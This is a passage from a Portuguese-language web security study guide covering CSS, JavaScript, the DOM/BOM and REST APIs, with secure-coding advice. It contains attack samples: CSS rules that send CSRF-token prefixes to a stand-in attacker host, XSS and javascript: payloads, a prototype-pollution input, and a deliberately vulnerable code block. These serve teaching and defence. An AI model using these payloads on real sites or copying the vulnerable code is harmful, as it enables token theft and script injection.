2. **Cascata e Especificidade:** quando várias regras disputam o mesmo elemento, vence a que tiver maior prioridade na ordem: `!important` $>$ estilo inline (`style="..."`) $>$ ID (`#id`, peso 1-0-0) $>$ classe/atributo/pseudo-classe (`.cls`, `[attr]`, peso 0-1-0) $>$ elemento (`div`, peso 0-0-1), desempatando pela regra declarada por último.
3. **Box Model (Modelo de Caixa):** todo elemento no documento é um retângulo composto, de dentro para fora, por quatro áreas: **`content`** (conteúdo) $\rightarrow$ **`padding`** (preenchimento interno) $\rightarrow$ **`border`** (borda) $\rightarrow$ **`margin`** (margem externa). Com `box-sizing: border-box`, a largura (`width`) declarada passa a incluir `content + padding + border`.
4. **Empilhamento e Visibilidade:** propriedades como `position: fixed/absolute`, `z-index`, `opacity: 0` (invisível, mas **continua recebendo cliques!**), `visibility: hidden` (invisível e não recebe cliques, mas ocupa espaço) e `pointer-events: none` (cliques atravessam o elemento) controlam como camadas visuais se sobrepõem.

**Exemplo prático (Demonstração do perigo de seletores de atributo e sobreposição):**

```css
/* 1. Uso legítimo: estilizar links externos que começam com https:// */
a[href^="https://"]::after {
  content: " ↗";
}

/* 2. Vetor de ataque (CSS Injection — Exfiltração de atributo sem JavaScript!):
   Se um atacante conseguir injetar CSS na página, ele pode descobrir o valor de um
   input hidden (como um token CSRF) caractere por caractere: quando o seletor casa,
   o navegador faz uma requisição GET para buscar a imagem de fundo no servidor do atacante! */
input[name="csrf_token"][value^="9"] {
  background-image: url("https://atacante.test/roubo?prefixo=9");
}
input[name="csrf_token"][value^="9f"] {
  background-image: url("https://atacante.test/roubo?prefixo=9f");
}
```

##### Possíveis problemas de segurança

1. **CSS Injection e Exfiltração de Dados (*CSS Keylogger / Attribute Exfiltration*):** mesmo que uma aplicação bloqueie totalmente a execução de JavaScript via CSP (`script-src 'none'`), se um atacante conseguir injetar regras CSS (ex.: via parâmetro de tema mal sanitizado ou tag `<style>` injetada), ele pode usar seletores de atributo `input[value^="..."]` combinados com `background: url(...)` ou `@font-face` (*ligatures*) para exfiltrar tokens anti-CSRF, códigos de convite ou dados presentes no HTML.
2. **UI Redressing / Clickjacking ([Seção 3.12](./03a-vulnerabilidades-parte1.md#s3)):** um site malicioso carrega a aplicação legítima dentro de um `<iframe style="opacity: 0.0001; position: absolute; z-index: 9999;">` posicionado exatamente sobre um botão chamativo ("Ganhe um prêmio"). O usuário acha que está clicando no botão do site malicioso, mas na verdade está clicando no botão invisível "Excluir conta" ou "Autorizar aplicativo" dentro do iframe autenticado!
3. **Ocultação cosmética de controles sensíveis:** esconder um painel administrativo apenas com `.painel-admin { display: none; }` é uma falha grave — qualquer usuário abre o DevTools, desmarca a regra CSS na aba Elements/Styles e visualiza os dados que já vieram no HTML.

##### Configuração segura

- **[REQUISITO]** Nunca enviar no HTML dados que o usuário atual não tenha permissão para ver (não usar `display: none` ou `opacity: 0` como controle de acesso).
- **[REQUISITO]** Proteger páginas sensíveis contra embutimento em iframes de terceiros usando o header `Content-Security-Policy: frame-ancestors 'none'` (ou `'self'`) e `X-Frame-Options: DENY` ([Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **[RECOMENDAÇÃO]** Não interpolar entradas de usuários dentro de tags `<style>` ou atributos `style="..."`; restringir de onde estilos e imagens podem ser carregados usando `style-src` e `img-src` na Content Security Policy (CSP), o que bloqueia a exfiltração para domínios externos.

---

<a id="s1-8-3"></a>
#### 1.8.3 JavaScript

**O que é:** o **JavaScript** (padronizado como **ECMAScript** pela especificação ECMA-262) é uma linguagem de programação dinâmica, interpretada/compilada *just-in-time* (JIT — ex.: motor V8 no Chrome) e multiparadigma (orientada a objetos baseada em protótipos, funcional e orientada a eventos), executada diretamente no navegador do cliente (e também no servidor via ambientes como Node.js, Deno e Bun).

**Para que serve:** manipular dinamicamente o DOM e o CSSOM, reagir a eventos do usuário (cliques, digitação, envio de formulários), realizar requisições de rede em segundo plano sem recarregar a página (`fetch()`, WebSockets, Server-Sent Events) e gerenciar o estado de aplicações complexas (SPAs).

**Como funciona (Modelo de Concorrência, Event Loop e Assincronismo):**

O JavaScript no navegador executa em uma **única thread principal (*single-threaded*)**, compartilhada com a renderização da página (Layout e Paint). Se um script executar um laço pesado síncrono por 5 segundos, a aba inteira congela. Para realizar operações demoradas (como requisições HTTP ou temporizadores) sem travar a interface, o navegador utiliza o **Event Loop** (laço de eventos):

```mermaid
flowchart LR
    CS["Call Stack\n(Pilha de Execução JS)"] -->|Chama fetch / setTimeout| WA["Web APIs do Navegador\n(Rede, Timers, DOM Events)"]
    WA -->|Promise resolvida\n(.then / await)| MQ["Microtask Queue\n(Prioridade Alta)"]
    WA -->|Callback de Timer / Evento\n(setTimeout / click)| TQ["Task / Macrotask Queue\n(Prioridade Normal)"]
    MQ -->|1º Esvazia TODAS\nquando a Stack fica vazia| EL{"Event Loop"}
    TQ -->|2º Pega UMA tarefa por giro\ne permite Renderização| EL
    EL --> CS
```

- **Call Stack (Pilha de chamadas):** executa o código síncrono linha por linha (LIFO — *Last In, First Out*).
- **Web APIs:** recursos fornecidos pelo navegador fora do motor JS puro (`fetch`, `setTimeout`, `IndexedDB`, eventos de DOM).
- **Microtask Queue (Fila de Microtarefas):** armazena continuações de **`Promise`** (`.then()`, `.catch()`, `.finally()`, código após `await` em funções `async`) e `queueMicrotask()`. **Tem prioridade máxima:** assim que a *Call Stack* esvazia, o *Event Loop* executa **todas** as microtarefas pendentes antes de devolver o controle para a renderização ou para a fila de macrotarefas.
- **Task Queue / Macrotask Queue (Fila de Tarefas):** armazena callbacks de `setTimeout`, `setInterval`, eventos de clique/teclado e mensagens de I/O.
- **`Promise` e `async/await`:** uma `Promise` é um objeto que representa o resultado futuro de uma operação assíncrona, podendo estar em um de três estados: **`pending`** (pendente), **`fulfilled`** (resolvida com sucesso) ou **`rejected`** (rejeitada com erro). A sintaxe `async/await` é açúcar sintático sobre *Promises* que permite escrever código assíncrono com leitura sequencial e tratamento estruturado de erros via `try / catch`.

**Exemplo prático (Assincronismo seguro vs. Padrões vulneráveis em JS):**

```javascript
// =========================================================================
// ❌ CÓDIGO VULNERÁVEL (NUNCA FAÇA ISSO):
// =========================================================================
// 1. Segredo de backend exposto no bundle JS do cliente:
const STRIPE_SECRET_KEY = "sk_live_51N9xYzSegredoCriticoDoServidor"; // Qualquer um vê na aba Sources/Network!

// 2. Validação/autorização apenas no cliente:
function excluirUsuario(id) {
  if (window.usuarioAtual.isAdmin) { // No Console, o usuário digita: window.usuarioAtual.isAdmin = true
    fetch(`/api/usuarios/${id}`, { method: 'DELETE' }); // Se o servidor não validar lá, qualquer um apaga!
  }
}

// 3. Uso de eval() e innerHTML com dados não confiáveis:
const filtro = new URLSearchParams(location.search).get('msg');
setTimeout("console.log('" + filtro + "')", 100); // Equivalente a eval()! Permite injeção de código JS
document.getElementById('aviso').innerHTML = filtro; // XSS direto se filtro for <img src=x onerror=alert(1)>

// =========================================================================
// ✅ CÓDIGO SEGURO E RECOMENDADO:
// =========================================================================
async function carregarAvisoSeguro() {
  const avisoEl = document.getElementById('aviso');
  const msgParam = new URLSearchParams(location.search).get('msg') ?? '';

  // textContent insere apenas texto puro, neutralizando qualquer tag HTML ou script:
  avisoEl.textContent = `Filtro aplicado: ${msgParam}`;

  // Passa uma função real para setTimeout (nunca uma string!):
  setTimeout(() => {
    console.info('Aviso exibido com segurança.');
  }, 100);
}
```

##### Possíveis problemas de segurança

1. **Confiar em validação ou autorização apenas no cliente:** qualquer variável JS, estado de Redux/Pinia ou rota protegida no React/Vue/Angular (`PrivateRoute`) reside no navegador do usuário e pode ser modificada no Console ou no depurador da aba *Sources*.
2. **Execução dinâmica de strings como código (`eval` e equivalentes):** `eval(str)`, `new Function(str)`, `setTimeout("...", ms)` e `setInterval("...", ms)` invocam o compilador JS sobre uma string em tempo de execução. Se qualquer parte dessa string vier do usuário, da URL ou de uma mensagem externa, ocorre **injeção arbitrária de JavaScript (XSS)**.
3. **Inserção insegura de HTML (`innerHTML`, `outerHTML`, `document.write`):** atribuir strings não sanitizadas a essas propriedades faz o navegador interpretar tags `<script>`, `<img onerror=...>` ou `<svg onload=...>`.
4. **Exposição de segredos e *Source Maps* no bundle JavaScript:** variáveis embutidas no build de front-end (como `VITE_...`, `NEXT_PUBLIC_...`, `REACT_APP_...`) **são empacotadas no arquivo `.js` público** enviado ao navegador. Além disso, esquecer arquivos `.js.map` (*Source Maps*) acessíveis em produção reconstrói todo o código-fonte original, comentários internos e nomes de variáveis na aba *Sources* do DevTools.
5. **Poluição de Protótipo (*Prototype Pollution*):** em JavaScript, quase todos os objetos herdam propriedades de `Object.prototype`. Se uma função de *merge* profundo ou clonagem copiar chaves de um JSON controlado pelo atacante sem filtrar as chaves especiais **`__proto__`**, **`constructor`** e **`prototype`**, o atacante pode injetar propriedades globais em todos os objetos da aplicação (ex.: enviar `{"__proto__": {"isAdmin": true}}` ou injetar *gadgets* que acionam XSS em bibliotecas de template).

##### Configuração segura

- **[REQUISITO]** Nunca incluir chaves secretas de API, credenciais de banco ou segredos de assinatura no código front-end; chamadas que exigem chaves secretas devem passar pelo servidor de back-end (onde ficam em variáveis de ambiente protegidas).
- **[REQUISITO]** Substituir `innerHTML` por **`textContent`** (ou `innerText`) sempre que o dado for texto. Se for estritamente necessário renderizar HTML rico (ex.: editor de texto), sanitizar antes com uma biblioteca robusta como **DOMPurify** (`elemento.innerHTML = DOMPurify.sanitize(htmlNaoConfiavel)`).
- **[REQUISITO]** Proibir `eval()`, `new Function()` e temporizadores com string (reforçando com `Content-Security-Policy` sem `'unsafe-eval'` e com `eslint` `no-eval` / `no-implied-eval`).
- **[RECOMENDAÇÃO]** Prevenir *Prototype Pollution* validando schemas JSON, bloqueando as chaves `__proto__`, `constructor` e `prototype`, usando `Map` ou `Object.create(null)` para dicionários dinâmicos e, quando viável, congelando o protótipo base com `Object.freeze(Object.prototype)`. Desabilitar a publicação de arquivos `.map` públicos em produção.

---

<a id="s1-9"></a>
### 1.9 DOM e BOM

Quando o JavaScript roda dentro do navegador, ele interage com dois conjuntos de objetos de ambiente que costumam cair juntos em provas:

- **DOM (*Document Object Model* — Modelo de Objeto de Documento):** representa o **conteúdo e a estrutura do documento HTML** carregado na aba (padronizado pelo WHATWG/W3C, tendo `document` como ponto de entrada).
- **BOM (*Browser Object Model* — Modelo de Objeto do Navegador):** representa a **janela do navegador e o ambiente ao redor do documento** — barra de endereços, histórico de navegação, dimensões do monitor, informações do navegador e comunicação entre janelas (tendo `window` como objeto global).

<a id="s1-9-1"></a>
#### 1.9.1 DOM (Document Object Model)

**O que é:** o **DOM** é uma interface de programação (API) multiplataforma que representa o documento HTML (ou XML) em memória como uma **árvore hierárquica de nós (*Node Tree*)**. Cada tag HTML vira um nó do tipo `Element`, cada atributo vira um `Attr`, cada trecho de texto vira um nó `Text` e cada comentário vira um `Comment`, todos descendentes da raiz `document`.

**Para que serve:** permitir que scripts leiam e modifiquem dinamicamente a estrutura, o conteúdo e o estilo da página em tempo real (adicionar itens a uma lista, validar campos, exibir modais) e escutar eventos disparados pelo usuário.

**Como funciona:**

##### 1. Seleção, criação e manipulação de nós (`textContent` vs. `innerHTML`)

| Método / Propriedade | Função | Implicação de Segurança |
|---|---|---|
| `document.getElementById('id')` | Retorna o elemento com o `id` exato | Seguro (apenas leitura de referência) |
| `document.querySelector('.classe')` | Retorna o primeiro elemento que casa com o seletor CSS | Cuidado se o seletor for construído com entrada do usuário sem `CSS.escape()` |
| `document.querySelectorAll('li')` | Retorna uma `NodeList` estática com todos os elementos correspondentes | Seguro |
| `document.createElement('div')` | Cria um novo elemento HTML em memória | **Forma segura** de construir estrutura DOM programaticamente |
| `pai.appendChild(filho)` / `pai.append(...)` | Anexa um nó filho ao elemento pai | Seguro quando combinado com `createElement` e `textContent` |
| **`el.textContent = valor`** | Define ou lê o **texto literal** do nó | **SEGURO contra XSS:** caracteres como `<`, `>`, `&` são tratados como texto puro, nunca como tags HTML! |
| **`el.innerHTML = valor`** | Faz o *parse* da string como **HTML** e reconstrói os nós filhos | **PERIGOSO (Sink de XSS):** se `valor` contiver `<img src=x onerror=alert(1)>`, o código JS malicioso será executado! |

##### 2. Propagação e Delegação de Eventos

Quando o usuário clica em um `<button>` dentro de uma `<div>` dentro do `<body>`, o evento de DOM percorre três fases:
1. **Capturing Phase (Fase de Captura):** desce de `window` $\rightarrow$ `document` $\rightarrow$ `body` $\rightarrow$ `div` até o alvo.
2. **Target Phase (Fase de Alvo):** chega ao elemento clicado (`event.target`).
3. **Bubbling Phase (Fase de Borbulhamento — padrão do `addEventListener`):** sobe do elemento clicado de volta até `window`.

A **delegação de eventos (*event delegation*)** aproveita o *bubbling*: em vez de pendurar 500 ouvintes de clique em 500 botões de uma tabela (e perder os ouvintes ao adicionar novas linhas), adiciona-se **um único `addEventListener('click', ...)` no elemento pai (`<tbody>`)** e inspeciona-se `event.target.closest('button')`.

##### 3. Fontes (*Sources*) e Sumidouros (*Sinks*) de DOM-based XSS e Trusted Types

O **DOM-based XSS** ([Seção 3.2](./03a-vulnerabilidades-parte1.md#s3)) ocorre quando o JavaScript da própria página pega um dado de uma **Fonte (*Source*)** controlada pelo atacante e o despeja sem sanitização em um **Sumidouro (*Sink*)** perigoso que interpreta código ou marcação:

| Fontes (*Sources* — onde o dado não confiável entra) | Sumidouros (*Sinks* — onde o dado causa execução/dano) |
|---|---|
| `location.search` (query string `?q=...`) | **Execução de HTML:** `element.innerHTML`, `element.outerHTML`, `element.insertAdjacentHTML()`, `document.write()`, `document.writeln()` |
| `location.hash` (fragmento `#...` — **não vai ao servidor!**) | **Execução direta de JS:** `eval()`, `Function()`, `setTimeout(str)`, `setInterval(str)` |
| `location.href` / `location.pathname` | **Navegação / URLs perigosas (`javascript:`):** `location.href = ...`, `location.assign()`, `location.replace()`, `window.open()`, `a.href = ...`, `iframe.src = ...` |
| `document.referrer` | **Carregamento de script:** `scriptElement.src = ...`, `scriptElement.textContent = ...` |
| `window.name` (persiste entre navegações na mesma aba!) | **Handlers de evento inline:** `element.setAttribute('onclick', ...)`, `element.setAttribute('onerror', ...)` |
| `event.data` (recebido via `window.postMessage`) | `iframe.srcdoc = ...` |
| `localStorage` / `sessionStorage` / `document.cookie` | Manipuladores jQuery legados: `$().html()`, `$(location.hash)` |

**Trusted Types (API W3C / CSP):** para erradicar o DOM XSS na raiz, navegadores modernos implementam a API **Trusted Types** **[Varia por versão]** (nativa no Chromium e ativada via header `Content-Security-Policy: require-trusted-types-for 'script'`). Com ela ativa, o navegador **bloqueia** qualquer tentativa de passar uma string comum para `innerHTML`, `eval` ou `script.src`, lançando um `TypeError`. O desenvolvedor é obrigado a passar o dado por uma política centralizada de sanitização que retorna um objeto tipado `TrustedHTML`, `TrustedScript` ou `TrustedScriptURL`.

**Exemplo prático (Manipulação segura do DOM com Delegação de Eventos e Trusted Types):**

```javascript
// 1. Criação segura de elementos sem usar innerHTML:
function adicionarComentarioSeguro(autor, texto) {
  const lista = document.querySelector('#lista-comentarios');
  const item = document.createElement('li');
  const strong = document.createElement('strong');

  strong.textContent = `${autor}: `; // Mesmo que 'autor' tenha "<script>", vira texto literal
  item.appendChild(strong);
  item.append(document.createTextNode(texto));
  lista.appendChild(item);
}

// 2. Delegação de eventos em uma única chamada no elemento pai:
document.querySelector('#lista-comentarios').addEventListener('click', (event) => {
  const botaoExcluir = event.target.closest('button[data-acao="excluir"]');
  if (!botaoExcluir) return;
  const idComentario = botaoExcluir.dataset.id;
  console.log('Solicitando exclusão do comentário:', idComentario);
});
```

##### Configuração segura

- **[REQUISITO]** Nunca ligar uma *Source* (como `location.search` ou `location.hash`) a um *Sink* de HTML ou navegação sem validação estrita. Para links dinâmicos (`a.href` ou `location.href`), validar com `new URL(destino, location.origin)` e exigir que `url.protocol` seja estritamente `'https:'` ou `'http:'` (bloqueando `'javascript:'` e `'data:'`).
- **[BOA PRÁTICA]** Habilitar `Content-Security-Policy: require-trusted-types-for 'script'` com uma política baseada em DOMPurify.

---

<a id="s1-9-2"></a>
#### 1.9.2 BOM (Browser Object Model)

**O que é:** o **BOM** é o conjunto de objetos fornecidos pelo navegador sob o escopo global **`window`**, permitindo que o JavaScript interaja com a janela/aba, a barra de endereços, o histórico da sessão, os recursos de hardware/sistema reportados pelo navegador e outras janelas ou iframes.

**Para que serve:** ler e alterar a URL atual, controlar a navegação sem recarregar a página (base do roteamento de SPAs), consultar capacidades do dispositivo, abrir ou comunicar-se com outras janelas/iframes de forma controlada.

**Como funciona (Objetos principais do BOM):**

1. **`window`:** é o objeto global da aba (ou do `<iframe>`). Variáveis declaradas com `var` no escopo global tornam-se propriedades de `window` (diferente de `let` e `const`, que não poluem `window`).
2. **`window.location` (ou `document.location`):** decompõe e controla a URL atual. Para `https://loja-ficticia.test:8443/busca?item=notebook#avaliacoes`:
   - `location.href`: URL inteira (atribuir um novo valor navega para outra página).
   - `location.protocol`: `"https:"`
   - `location.host`: `"loja-ficticia.test:8443"` (`hostname` é só `"loja-ficticia.test"`, `port` é `"8443"`).
   - `location.origin`: `"https://loja-ficticia.test:8443"` (somente leitura).
   - `location.pathname`: `"/busca"`
   - `location.search`: `"?item=notebook"` (manipulado de forma segura com `new URLSearchParams(location.search)`).
   - `location.hash`: `"#avaliacoes"`
   - `location.assign(url)` (navega adicionando entrada no histórico) vs. `location.replace(url)` (navega **substituindo** a entrada atual no histórico, útil após login/redirect para não prender o botão Voltar).
3. **`window.history`:** permite navegar na sessão da aba (`history.back()`, `history.forward()`, `history.go(-2)`) e, via **History API** (`history.pushState(state, unused, url)` e `history.replaceState(...)`), alterar o caminho da URL na barra de endereços da mesma origem **sem disparar uma requisição HTTP de recarregamento de página**.
4. **`window.navigator` e `window.screen`:**
   - `navigator`: expõe informações do agente de usuário (`navigator.userAgent`, `navigator.userAgentData` Client Hints, `navigator.language`, `navigator.onLine`, `navigator.hardwareConcurrency`) e APIs sensíveis sujeitas a permissão (`navigator.geolocation`, `navigator.clipboard`, `navigator.mediaDevices`, `navigator.serviceWorker`, `navigator.credentials` para WebAuthn).
   - `screen`: expõe dimensões do monitor (`screen.width`, `screen.height`, `screen.colorDepth`).
   - *Nota de privacidade:* a combinação de propriedades de `navigator`, `screen`, fontes instaladas e renderização Canvas/WebGL permite criar uma impressão digital única do dispositivo (**Browser Fingerprinting**) para rastrear o usuário mesmo sem cookies.
5. **`window.postMessage(message, targetOrigin)`:** é o mecanismo oficial padronizado para comunicação assíncrona entre janelas/iframes de **origens diferentes** (*cross-origin messaging*).
6. **`window.opener`:** quando uma página A abre uma página B (via `<a target="_blank">` sem `noopener` ou via `window.open()`), a página B pode receber em `window.opener` uma referência para o objeto `window` da página A.

##### Possíveis problemas de segurança no BOM

1. **`postMessage` sem validação de `event.origin` (Recepção insegura):** qualquer janela ou iframe na internet pode enviar um `postMessage` para a sua página se ela tiver um `window.addEventListener('message', ...)`. Se o ouvinte confiar em `event.data` sem verificar primeiro `event.origin`, um site atacante abre a vítima em um iframe ou pop-up e envia payloads maliciosos (causando DOM XSS ou roubo de estado).
2. **`postMessage` com `targetOrigin = "*"` (Envio inseguro):** ao chamar `outraJanela.postMessage(dadosSensiveis, '*')`, o coringa `'*'` autoriza o navegador a entregar a mensagem **independentemente de qual site esteja carregado naquela janela no momento do envio**. Se o iframe ou pop-up tiver sido redirecionado para `https://atacante.test`, o segredo é entregue diretamente ao atacante!
3. **Reverse Tabnabbing via `window.opener`:** se `loja-ficticia.test` tiver um link `<a href="https://site-externo.test" target="_blank">` e `window.opener` não for isolado, o `site-externo.test` pode executar `window.opener.location.replace('https://loja-ficticia-falsa.test/login')`. Quando o usuário volta para a aba original onde já estava usando a loja, vê uma tela idêntica pedindo que digite sua senha novamente ("Sua sessão expirou") e entrega suas credenciais ao atacante.
4. **Open Redirect e XSS via `location.href`:** fazer `location.href = new URLSearchParams(location.search).get('redirect')` sem validar o destino permite redirecionar o usuário para um site de phishing (`?redirect=https://banco-falso.test`) ou executar JavaScript na própria página (`?redirect=javascript:alert(document.domain)`).

**Exemplo prático (Uso seguro de `postMessage` e prevenção de Open Redirect):**

```javascript
// =========================================================================
// 1. ENVIO SEGURO via postMessage: especifique SEMPRE a origem exata de destino!
// =========================================================================
const iframeCheckout = document.getElementById('iframe-pagamento');
iframeCheckout.contentWindow.postMessage(
  { tipo: 'ATUALIZAR_CARRINHO', totalCentavos: 15990 },
  'https://pagamentos.loja-ficticia.test' // NUNCA use '*' para dados de negócio ou tokens!
);

// =========================================================================
// 2. RECEPÇÃO SEGURA via postMessage: valide SEMPRE event.origin com allowlist!
// =========================================================================
const ORIGENS_CONFIAVEIS = new Set([
  'https://pagamentos.loja-ficticia.test',
  'https://auth.loja-ficticia.test'
]);

window.addEventListener('message', (event) => {
  // Passo 1 (OBRIGATÓRIO): Validar estritamente quem enviou a mensagem
  if (!ORIGENS_CONFIAVEIS.has(event.origin)) {
    console.warn('Mensagem bloqueada de origem não confiável:', event.origin);
    return;
  }

  // Passo 2: Validar formato dos dados e usar APIs seguras do DOM (textContent)
  if (event.data && event.data.tipo === 'STATUS_PAGAMENTO') {
    document.getElementById('status').textContent = String(event.data.mensagem);
  }
});

// =========================================================================
// 3. REDIRECIONAMENTO SEGURO via location (prevenindo Open Redirect e javascript:)
// =========================================================================
function redirecionarParaRotaInterna(parametroProximo) {
  try {
    const destino = new URL(parametroProximo, window.location.origin);
    // Garante que o destino pertence EXATAMENTE à mesma origem da aplicação:
    if (destino.origin === window.location.origin) {
      window.location.assign(destino.href);
    } else {
      window.location.assign('/home');
    }
  } catch {
    window.location.assign('/home');
  }
}
```

##### Configuração segura

- **[REQUISITO]** Em todo listener de `message`, verificar `event.origin` contra uma lista exata de origens permitidas (nunca usar `.includes()` ou regex frouxa) antes de ler `event.data`. No envio, informar o `targetOrigin` exato.
- **[REQUISITO]** Validar qualquer redirecionamento controlado pelo usuário garantindo que permaneça na mesma origem (`destino.origin === location.origin`) ou em uma *allowlist* estrita.
- **[RECOMENDAÇÃO]** Usar `rel="noopener noreferrer"` em links `target="_blank"`, anular `novoPopup.opener = null` ao usar `window.open()` para origens externas e configurar o header `Cross-Origin-Opener-Policy: same-origin` ([Headers de Segurança](./05-headers-de-seguranca.md#s5)).

---

<a id="s1-10"></a>
### 1.10 APIs REST e JSON

**O que é:**
- **API (*Application Programming Interface* — Interface de Programação de Aplicações):** é um contrato formal de comunicação que define como diferentes componentes de software (ex.: o front-end no navegador, um aplicativo móvel e um servidor de back-end) trocam dados e invocam funcionalidades entre si.
- **REST (*Representational State Transfer* — Transferência de Estado Representacional):** formulado por Roy Fielding em sua tese de doutorado (2000), o REST **não é um protocolo nem um padrão fechado**, mas sim um **estilo arquitetural** para sistemas hipermídia distribuídos que aproveita a semântica nativa do próprio protocolo HTTP. Uma API que segue as restrições do REST é chamada de **API RESTful**.
- **JSON (*JavaScript Object Notation* — Notação de Objetos JavaScript):** especificado na **RFC 8259**, é um formato aberto, leve e baseado em texto (UTF-8) para intercâmbio de dados estruturados. Apesar do nome histórico, é independente de linguagem e tornou-se o formato padrão das APIs REST modernas (`Content-Type: application/json`).

**Para que serve:** desacoplar o cliente (navegador, app Android/iOS, parceiro B2B) do servidor de aplicação, permitindo que múltiplas interfaces consumam as mesmas regras de negócio através de mensagens padronizadas, legíveis e interoperáveis.

**Como funciona:**

##### 1. As 6 restrições arquiteturais do REST

| Restrição | Significado técnico |
|---|---|
| **1. Cliente-Servidor (*Client-Server*)** | Separação de responsabilidades: o cliente cuida da interface e experiência do usuário; o servidor cuida do armazenamento de dados, segurança e regras de negócio. |
| **2. Sem Estado (*Stateless*)** | O servidor não guarda contexto de navegação do cliente na memória entre duas requisições. Cada requisição do cliente deve conter **toda** a informação necessária para ser compreendida e autenticada. |
| **3. Cacheável (*Cacheable*)** | Toda resposta deve declarar, implícita ou explicitamente (via headers como `Cache-Control` e `ETag` — [1.13](#s1-13)), se pode ou não ser armazenada em cache para economizar rede. |
| **4. Interface Uniforme (*Uniform Interface*)** | Padronização da comunicação: identificação de recursos por URIs, manipulação por representações (JSON), mensagens autodescritivas (verbos, status e `Content-Type` corretos) e HATEOAS (*Hypermedia as the Engine of Application State*). |
| **5. Sistema em Camadas (*Layered System*)** | O cliente não sabe (nem precisa saber) se está conectado diretamente ao servidor final ou passando por balanceadores de carga, WAFs, CDNs e gateways de API. |
| **6. Código sob Demanda (*Code on Demand* — Opcional)** | O servidor pode estender a funcionalidade do cliente enviando código executável (ex.: scripts JavaScript). É a única restrição opcional. |

##### 2. Modelagem de Recursos, Verbos, Status, Paginação e Versionamento

Em uma API REST bem projetada, as URLs representam **recursos (substantivos, tipicamente no plural)** e nunca verbos (evita-se `/api/criarPedido` ou `/api/deletarUsuario?id=10`). A ação é expressa pelo **método HTTP** ([1.4](./01a-fundamentos-web-parte1.md#s1)):

| Operação (CRUD) | Verbo HTTP | URI do Recurso (Exemplo) | Status HTTP de Sucesso Típico | Status de Erro Comuns |
|---|---|---|---|---|
| Listar coleção (com paginação/filtro) | `GET` | `/api/v1/pedidos?cursor=eyJpZCI6MTAwfQ&limit=20` | `200 OK` | `400`, `401`, `429` |
| Obter um recurso específico | `GET` | `/api/v1/pedidos/4821` | `200 OK` (ou `304 Not Modified`) | `401`, `403`, `404` |
| Criar novo recurso | `POST` | `/api/v1/pedidos` | `201 Created` (com header `Location: /api/v1/pedidos/4822`) | `400`, `401`, `409`, `422` |
| Substituir recurso inteiro | `PUT` | `/api/v1/pedidos/4821` | `200 OK` ou `204 No Content` | `400`, `401`, `403`, `404`, `422` |
| Atualizar parcialmente | `PATCH` | `/api/v1/pedidos/4821` | `200 OK` ou `204 No Content` | `400`, `401`, `403`, `404`, `422` |
| Remover recurso | `DELETE` | `/api/v1/pedidos/4821` | `204 No Content` (ou `200 OK`) | `401`, `403`, `404`, `409` |

- **Paginação:** essencial para desempenho e segurança (evita retornar 1 milhão de linhas em um único `GET`). Pode ser baseada em deslocamento (`?page=2&limit=20` / `offset=20` — simples, mas fica lenta em tabelas gigantes) ou baseada em cursor (`?after=id_4820&limit=20` — mais performática e consistente). **O servidor deve sempre impor um teto máximo para `limit`** (ex.: máximo de 100 itens por página).
- **Versionamento:** permite evoluir a API sem quebrar clientes existentes — geralmente via caminho da URI (`/api/v1/pedidos`, `/api/v2/pedidos`) ou negociação de conteúdo via header (`Accept: application/vnd.lojaficticia.v2+json`).

##### 3. Formato JSON (`JSON.stringify` e `JSON.parse`)

Pela **RFC 8259**, um documento JSON suporta exatamente **6 tipos de dados**:
1. **Objeto:** coleção de pares `"chave": valor` entre chaves `{ ... }` (as chaves **obrigatoriamente** devem estar entre **aspas duplas** `"`).
2. **Array (Lista):** sequência ordenada entre colchetes `[ ... ]`.
3. **String:** texto entre aspas duplas `"..."` (com escape `\n`, `\"`, `\\`, `\uXXXX`).
4. **Number:** inteiro ou ponto flutuante em base 10 (ex.: `42`, `-3.14`, `1.5e10` — *não aceita `NaN` nem `Infinity`*).
5. **Boolean:** `true` ou `false` (em minúsculas).
6. **Null:** `null`.

> [!NOTE]
> **Regras estritas do JSON cobradas em prova:** JSON padrão **não permite comentários** (`//` ou `/* */`), **não permite aspas simples** (`'chave'`), **não permite vírgula sobrando no final** (*trailing comma*, como `{"a": 1,}`) e **não possui tipo nativo para Datas ou funções** (datas são representadas como strings ISO 8601, ex.: `"2026-10-30T14:30:00Z"`).

No JavaScript, a conversão entre objetos em memória e strings JSON é feita por dois métodos nativos:
- **`JSON.stringify(objeto)`:** serializa um objeto JS para uma string JSON (para enviar no `body` do `fetch` ou salvar no `localStorage`). Propriedades com valor `undefined`, funções e `Symbol` são omitidas silenciosamente.
- **`JSON.parse(stringJson)`:** desserializa uma string JSON de volta para um objeto/valor JavaScript. **Atenção:** se a string estiver malformada (ex.: o servidor retornou uma página de erro HTML `<html>502 Bad Gateway</html>` em vez de JSON), `JSON.parse()` lança uma exceção síncrona **`SyntaxError: Unexpected token '<'..."`** — por isso deve estar sempre protegida por `try / catch` (ou validar `response.ok` e `Content-Type` antes).

**Exemplo prático (Fluxo completo de requisição e resposta REST):**

```http
POST /api/v1/enderecos HTTP/1.1
Host: api.loja-ficticia.test
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json; charset=utf-8
Accept: application/json
Content-Length: 109

{
  "apelido": "Casa",
  "cep": "01310-100",
  "logradouro": "Av. Paulista",
  "numero": "1000",
  "principal": true
}
```

```http
HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8
Location: /api/v1/enderecos/addr_9081
Cache-Control: no-store
X-Content-Type-Options: nosniff

{
  "id": "addr_9081",
  "apelido": "Casa",
  "cep": "01310-100",
  "logradouro": "Av. Paulista",
  "numero": "1000",
  "principal": true,
  "criadoEm": "2026-10-30T14:35:12Z"
}
```

##### Possíveis problemas de segurança em APIs REST (OWASP API Security Top 10)

1. **BOLA (*Broken Object Level Authorization* — API1:2023) / IDOR ([Seção 3.9](./03a-vulnerabilidades-parte1.md#s3)):** a API verifica que o usuário está logado, mas não verifica se o recurso solicitado na URL pertence a ele. O usuário `usr_4821` troca `GET /api/v1/enderecos/addr_9081` por `GET /api/v1/enderecos/addr_9080` e lê o endereço de outro cliente!
2. **Exposição Excessiva de Dados (*Excessive Data Exposure*) e Mass Assignment (API3:2023 — *Broken Object Property Level Authorization*):**
   - *Na saída (Excessive Data Exposure):* o back-end faz `SELECT * FROM usuarios` (ou carrega a entidade do ORM) e devolve `res.json(usuario)` direto na resposta. O front-end só exibe o `nome` na tela, mas na aba **Network $\rightarrow$ Response** do DevTools qualquer pessoa vê `senha_hash`, `cpf`, `telefone`, `is_admin` e `salario` no JSON!
